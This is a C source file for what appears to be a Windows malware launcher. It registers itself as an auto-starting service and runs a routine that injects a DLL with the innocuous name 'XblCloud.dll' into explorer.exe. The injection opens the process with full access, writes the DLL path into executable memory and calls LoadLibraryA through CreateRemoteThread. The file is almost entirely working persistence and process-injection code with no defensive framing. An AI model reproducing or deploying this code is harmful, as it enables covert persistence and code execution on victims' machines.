#include "launcher.h"

#if DEV
#define FORMAT_BUFF_SIZE 0x8000
VOID SvcFileLog(LPCSTR fmt, ...) {

	va_list argptr;
	DWORD tmp;
	HANDLE hLog = CreateFileA("D:\\z\\svc.txt", FILE_APPEND_DATA, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	if (hLog == INVALID_HANDLE_VALUE) {
		return;
	}

	va_start(argptr, fmt);

	LPSTR buff = (LPSTR)LocalAlloc(LMEM_FIXED, FORMAT_BUFF_SIZE);
	if (!buff) {
		return;
	}

	int ret = vsprintf_s(buff, FORMAT_BUFF_SIZE, fmt, argptr);
	buff[ret] = 0x00;

	WriteFile(hLog, buff, strlen(buff), &tmp, NULL);

	va_end(argptr);

	LocalFree(buff);
	CloseHandle(hLog);
}
#else
#define SvcFileLog(fmt, ...)
#endif

SERVICE_STATUS          gSvcStatus;
SERVICE_STATUS_HANDLE   gSvcStatusHandle;
HANDLE                  ghSvcStopEvent = NULL;

BOOL SvcInstall(LPSTR lpFilename, LPSTR lpSvcName, LPSTR lpSvcDisplayname) {
	SC_HANDLE schSCManager;
	SC_HANDLE schService;

	schSCManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (schSCManager == NULL) {
		SvcFileLog("OpenSCManager failed (%d)\n", GetLastError());
		return FALSE;
	}

	schService = CreateServiceA(schSCManager, lpSvcName, lpSvcDisplayname, SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS, SERVICE_AUTO_START, SERVICE_ERROR_NORMAL, lpFilename, NULL, NULL, NULL, NULL, NULL);
	if (schService == NULL) {
		SvcFileLog("CreateService failed (%d)\n", GetLastError());
		CloseServiceHandle(schSCManager);
		return FALSE;
	}

	SvcFileLog("Service installed successfully\n");
	Sleep(2000);

	if (!StartServiceA(schService, 0, NULL)) {
		//printf("StartService failed, GLE=%d\n", GetLastError());
		SvcFileLog("StartServiceA failed, GLE=%d\n", GetLastError());
		CloseServiceHandle(schService);
		CloseServiceHandle(schSCManager);
		return FALSE;
	}

	CloseServiceHandle(schService);
	CloseServiceHandle(schSCManager);
	return TRUE;
}

ESvcStatus SvcStatus(LPSTR lpSvcName) {
	SERVICE_STATUS_PROCESS svcStatus;
	DWORD dwOldCheckPoint;
	ULONGLONG dwStartTickCount;
	DWORD dwWaitTime;
	DWORD dwBytesNeeded;
	DWORD dwRet = 0;

	SC_HANDLE schSCManager;
	SC_HANDLE schService;

	schSCManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (schSCManager == NULL) {
		SvcFileLog("OpenSCManagerA failed\n");
		return ESvcStatus::Error;
	}

	schService = OpenServiceA(schSCManager, lpSvcName, SERVICE_ALL_ACCESS);
	if (schService == NULL) {
		dwRet = GetLastError();
		SvcFileLog("OpenServiceA failed, GLE=%d\n", GetLastError());
		CloseServiceHandle(schSCManager);
		return dwRet == ERROR_SERVICE_DOES_NOT_EXIST ? ESvcStatus::NotFound : ESvcStatus::Error;
	}

	if (!QueryServiceStatusEx(schService, SC_STATUS_PROCESS_INFO, (LPBYTE)&svcStatus, sizeof(SERVICE_STATUS_PROCESS), &dwBytesNeeded)) {
		SvcFileLog("QueryServiceStatusEx failed\n");
		CloseServiceHandle(schService);
		CloseServiceHandle(schSCManager);
		return ESvcStatus::Error;
	}

	SvcFileLog("Status %d\n", svcStatus.dwCurrentState);

	if (svcStatus.dwCurrentState != SERVICE_STOPPED && svcStatus.dwCurrentState != SERVICE_STOP_PENDING) {
		SvcFileLog("Service started\n");
		CloseServiceHandle(schService);
		CloseServiceHandle(schSCManager);
		return svcStatus.dwCurrentState == SERVICE_RUNNING ? ESvcStatus::Running : ESvcStatus::Error;
	}

	dwStartTickCount = GetTickCount64();
	dwOldCheckPoint = svcStatus.dwCheckPoint;

	while (svcStatus.dwCurrentState == SERVICE_STOP_PENDING) {

		dwWaitTime = svcStatus.dwWaitHint / 10;

		if (dwWaitTime < 1000) {
			dwWaitTime = 1000;
		} else if (dwWaitTime > 10000) {
			dwWaitTime = 10000;
		}

		Sleep(dwWaitTime);

		if (!QueryServiceStatusEx(schService, SC_STATUS_PROCESS_INFO, (LPBYTE)&svcStatus, sizeof(SERVICE_STATUS_PROCESS), &dwBytesNeeded)) {
			//printf("QueryServiceStatusEx failed, GLE=%d\n", GetLastError());
			SvcFileLog("QueryServiceStatusEx failed\n");
			CloseServiceHandle(schService);
			CloseServiceHandle(schSCManager);
			return ESvcStatus::Error;
		}

		if (svcStatus.dwCheckPoint > dwOldCheckPoint) {
			dwStartTickCount = GetTickCount64();
			dwOldCheckPoint = svcStatus.dwCheckPoint;
		} else {
			if (GetTickCount64() - dwStartTickCount > svcStatus.dwWaitHint) {
				//printf("Timeout waiting for service to stop\n");
				SvcFileLog("Timeout failed\n");
				CloseServiceHandle(schService);
				CloseServiceHandle(schSCManager);
				return ESvcStatus::Error;
			}
		}
	}

	if (!StartServiceA(schService, 0, NULL)) {
		//printf("StartService failed, GLE=%d\n", GetLastError());
		SvcFileLog("StartServiceA 2 failed, GLE=%d\n", GetLastError());
		CloseServiceHandle(schService);
		CloseServiceHandle(schSCManager);
		return ESvcStatus::Error;
	}

	//printf("Service starting...\n");
	SvcFileLog("Service starting...\n");

	CloseServiceHandle(schService);
	CloseServiceHandle(schSCManager);

	return ESvcStatus::Running;
}

inline DWORD Random(DWORD min, DWORD max) {
	return min + (rand() % (max - min + 1));
}

VOID ReportSvcStatus(DWORD dwCurrentState, DWORD dwWin32ExitCode, DWORD dwWaitHint) {
	static DWORD dwCheckPoint = 1;

	gSvcStatus.dwCurrentState = dwCurrentState;
	gSvcStatus.dwWin32ExitCode = dwWin32ExitCode;
	gSvcStatus.dwWaitHint = dwWaitHint;

	if (dwCurrentState == SERVICE_START_PENDING) {
		gSvcStatus.dwControlsAccepted = 0;
	} else {
		gSvcStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;
	}

	if (dwCurrentState == SERVICE_RUNNING || dwCurrentState == SERVICE_STOPPED) {
		gSvcStatus.dwCheckPoint = 0;
	} else {
		gSvcStatus.dwCheckPoint = dwCheckPoint++;
	}

	SetServiceStatus(gSvcStatusHandle, &gSvcStatus);
}

VOID WINAPI SvcCtrlHandler(DWORD dwCtrl) {

	switch (dwCtrl) {
		case SERVICE_CONTROL_STOP:
			ReportSvcStatus(SERVICE_STOP_PENDING, NO_ERROR, 0);
			SetEvent(ghSvcStopEvent);
			ReportSvcStatus(gSvcStatus.dwCurrentState, NO_ERROR, 0);
			return;

		case SERVICE_CONTROL_INTERROGATE:
			break;

		default:
			break;
	}
}

inline BOOL FileExists(LPSTR lpFilpath) {
	WIN32_FIND_DATAA FindFileData;
	HANDLE handle = FindFirstFileA(lpFilpath, &FindFileData);
	BOOL found = handle != INVALID_HANDLE_VALUE;
	if (found) {
		FindClose(handle);
	}
	return found;
}

BOOL HookExplorer() {

	DWORD dwProcesses[1024], cbNeeded, szProcesses;
	DWORD dwPid = 0;

	if (!EnumProcesses(dwProcesses, sizeof(dwProcesses), &cbNeeded)) {
		SvcFileLog("EnumProcesses\n");
		return 1;
	}
	szProcesses = cbNeeded / sizeof(DWORD);

	CHAR lpExplorer[MAX_PATH];
	if (!GetWindowsDirectoryA(lpExplorer, MAX_PATH)) {
		SvcFileLog("GetWindowsDirectoryA\n");
		return 1;
	}

	strcat_s(lpExplorer, MAX_PATH - strlen(lpExplorer), "\\explorer.exe");
	_strlwr_s(lpExplorer, MAX_PATH);

	for (int i = 0; i < szProcesses; i++) {
		if (dwProcesses[i] != 0) {
			HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, dwProcesses[i]);

			if (hProcess != NULL) {
				HMODULE hMod;
				DWORD cbNeeded;
				CHAR szProcessName[MAX_PATH];

				if (EnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeeded)) {
					GetModuleFileNameExA(hProcess, hMod, szProcessName, sizeof(szProcessName) / sizeof(CHAR));
					_strlwr_s(szProcessName, MAX_PATH);
					if (strcmp(lpExplorer, szProcessName) == 0) {
						dwPid = dwProcesses[i];
						break;
					}
				}
				CloseHandle(hProcess);
			}
		}
	}

	SvcFileLog("PID=%d\n", dwPid);

	HANDLE hExplorer = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);
	if (!hExplorer) {
		SvcFileLog("OpenProcess\n");
		return 1;
	}

	PVOID buff = VirtualAllocEx(hExplorer, NULL, 0x100, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (!buff) {
		SvcFileLog("VirtualAllocEx\n");
		return 1;
	}

	CHAR lpWindowsPath[MAX_PATH];
	GetSystemDirectoryA(lpWindowsPath, MAX_PATH);
	_strlwr_s(lpWindowsPath, MAX_PATH);

	CHAR lpDll[MAX_PATH];
	ZeroMemory(lpDll, MAX_PATH);
	CopyMemory(lpDll, lpWindowsPath, MAX_PATH);
	strcat_s(lpDll, MAX_PATH, "\\XblCloud.dll");

	SIZE_T szRet = 0;
	if (!WriteProcessMemory(hExplorer, buff, lpDll, strlen(lpDll), &szRet)) {
		SvcFileLog("WriteProcessMemory\n");
		return 1;
	}

	HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
	if (!hKernel32) {
		SvcFileLog("GetModuleHandleA\n");
		return 1;
	}

	FARPROC pLoadLibraryA = GetProcAddress(hKernel32, "LoadLibraryA");
	if (!pLoadLibraryA) {
		return 1;
	}

	HANDLE hThread = CreateRemoteThread(hExplorer, NULL, NULL, (LPTHREAD_START_ROUTINE)pLoadLibraryA, buff, NULL, NULL);
	if (!hThread) {
		return 1;
	}


	WaitForSingleObject(hThread, INFINITE);

	return 0;
}

VOID SvcInit(DWORD dwArgc, LPSTR* lpszArgv) {

	ghSvcStopEvent = CreateEventA(NULL, TRUE, FALSE, NULL);
	if (ghSvcStopEvent == NULL) {
		ReportSvcStatus(SERVICE_STOPPED, NO_ERROR, 0);
		return;
	}

	ReportSvcStatus(SERVICE_RUNNING, NO_ERROR, 0);


	if (!HookExplorer()) {
		SvcFileLog("Hook success!\n");
	} else {
		SvcFileLog("Hook failed!\n");
	}

	int id = 0;
	while (TRUE) {

		Sleep(Random(5000, 10000));

		if (WaitForSingleObject(ghSvcStopEvent, 50) == WAIT_OBJECT_0) {
			ReportSvcStatus(SERVICE_STOPPED, NO_ERROR, 0);
			return;
		}
	}
}

VOID WINAPI SvcMain(DWORD dwNumServicesArgs, LPSTR* lpServiceArgVectors) {

	gSvcStatusHandle = RegisterServiceCtrlHandlerA(SVC_NAME, SvcCtrlHandler);
	if (!gSvcStatusHandle) {
		return;
	}

	gSvcStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
	gSvcStatus.dwServiceSpecificExitCode = 0;

	ReportSvcStatus(SERVICE_START_PENDING, NO_ERROR, 3000);
	SvcInit(dwNumServicesArgs, lpServiceArgVectors);
}